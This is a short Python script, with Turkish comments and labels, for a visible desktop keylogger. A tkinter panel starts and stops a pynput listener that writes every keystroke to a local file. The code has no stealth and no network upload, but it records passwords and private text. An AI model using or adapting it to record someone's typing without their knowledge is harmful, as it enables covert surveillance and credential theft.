import tkinter as tk
from pynput import keyboard
import threading
import time

log_file = "keylog.txt"
logging = False
listener = None

def write_to_file(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

def start_keylogger():
    global listener, logging
    logging = True

    def on_press(key):
        if logging:
            write_to_file(key)

    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_keylogger():
    global listener, logging
    logging = False
    if listener is not None:
        listener.stop()

# GUI kısmı
def create_gui():
    root = tk.Tk()
    root.title("Keylogger@Ege")
    root.geometry("300x150")
    root.resizable(False, False)

    label = tk.Label(root, text="Keylogger Kontrol Paneli", font=("Arial", 12))
    label.pack(pady=10)

    start_button = tk.Button(root, text="Başlat", command=start_keylogger, bg="green", fg="white")
    start_button.pack(pady=5)

    stop_button = tk.Button(root, text="Durdur", command=stop_keylogger, bg="red", fg="white")
    stop_button.pack(pady=5)

    root.mainloop()

# GUI'yi ayrı bir thread'de çalıştır
gui_thread = threading.Thread(target=create_gui)
gui_thread.start()
